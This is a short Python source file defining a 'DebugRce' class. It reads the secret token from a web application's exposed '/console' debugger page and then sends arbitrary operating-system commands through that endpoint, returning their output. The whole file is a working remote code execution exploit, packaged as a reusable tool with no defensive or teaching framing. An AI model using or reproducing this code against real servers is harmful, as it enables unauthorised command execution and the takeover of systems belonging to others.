'''Parser class'''
from requests_html import HTMLSession


class DebugRce:
	'''RCE class'''

	def __init__(self, host) -> None:
		'''init method'''
		self.host = host
		self.req = HTMLSession()
		self.secret = self.req.get(
			f'http://{self.host}/console').html.find('script')[1].text.split(' ')[-1][1:-2]

	def exec(self, cmd) -> list:
		'''.exec() method used to execute arbitrary commands'''

		cmd = f'''__import__('os').popen('{cmd}').read();'''
		res = self.req.get(
			f'http://{self.host}/console?__debugger__=yes&cmd={cmd}&frm=0&s={self.secret}')
		return res.html.text[1:-1].split('\\n')[0:-1]

	def show_host(self):
		'''.show_host() method used to show host'''
		return self.host
